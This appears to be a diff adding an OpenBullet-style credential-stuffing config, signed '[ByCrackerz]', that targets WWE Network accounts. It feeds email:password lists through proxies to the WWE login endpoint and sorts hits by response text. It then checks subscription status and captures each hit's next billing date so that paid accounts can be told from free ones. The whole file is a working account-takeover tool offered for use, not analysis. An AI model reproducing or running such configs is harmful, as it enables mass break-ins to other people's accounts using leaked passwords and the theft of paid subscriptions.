@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "wwe.com",
+  "SuggestedBots": 36,
+  "LastModified": "2019-03-13T21:37:55.1828483+01:00",
+  "AdditionalInfo": "",
+  "Author": "[ByCrackerz]",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://secure.net.wwe.com/enterworkflow.do?flowId=account.login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Login REQUEST POST "https://secure.net.wwe.com/workflow.do" AutoRedirect=TRUE 
+  CONTENT "registrationAction=identify&emailAddress=<USER>&password=<PASS>&submitButton=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://secure.net.wwe.com" 
+  HEADER "Referer: https://secure.net.wwe.com/enterworkflow.do?flowId=account.login" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Authentication Error. Please check email and/or password and try again" 
+  KEYCHAIN Success OR 
+    KEY "Profile" 
+REQUEST GET "https://secure.net.wwe.com/enterworkflow.do?flowId=subscriptions.updatesubscription" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://secure.net.wwe.com" 
+#Free_KEY KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "You are not currently subscribed to <b>WWE Network" 
+#Capture_Subscription PARSE "<SOURCE>" LR "Your next billing date is <b>" "</b>" Recursive=FALSE -> CAP "[subscription]Your next billing date is " "" "" 
